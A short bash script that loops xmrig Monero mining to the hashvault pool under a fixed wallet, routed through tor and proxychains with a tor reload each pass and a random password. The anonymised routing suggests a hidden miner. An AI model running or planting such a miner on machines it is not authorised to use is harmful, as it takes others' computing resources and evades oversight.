#!/bin/bash
while true
do
  echo hello
  sudo service tor reload
  proxychains ./xmrig --url pool.hashvault.pro:443 --user 43hYrzhUSh8dstMtd13LRabixKueWv8W5C575hGU2htfL7kkcF8UXW8gdokfJ78A1P2AV8HErQTS6NXHcLJP62KUEJWk6gt --pass $(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 7 | head -n 1) --keepalive --donate-level 1 --tls -t 8
done
